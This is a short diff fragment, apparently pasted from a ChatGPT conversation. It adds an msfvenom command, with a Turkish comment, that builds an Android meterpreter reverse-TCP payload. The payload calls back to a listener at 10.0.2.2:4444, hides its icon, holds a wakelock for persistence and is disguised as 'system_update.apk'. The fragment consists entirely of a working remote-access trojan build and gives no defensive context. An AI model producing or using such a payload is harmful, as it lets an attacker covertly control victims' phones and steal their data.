@@ -68,6 +68,17 @@ ChatGPT can make mistakes. Check important info.
 
 
 
+# API 34 için optimize payload (stagealess + persistence)
+msfvenom -p android/meterpreter_reverse_tcp \
+  LHOST=10.0.2.2 LPORT=4444 \
+  AndroidHideIcon=true \
+  AndroidWakelock=true \
+  MinSdkVersion=34 \
+  TargetSdkVersion=34 \
+  -o /tmp/system_update.apk
+
+
+
 
 
 
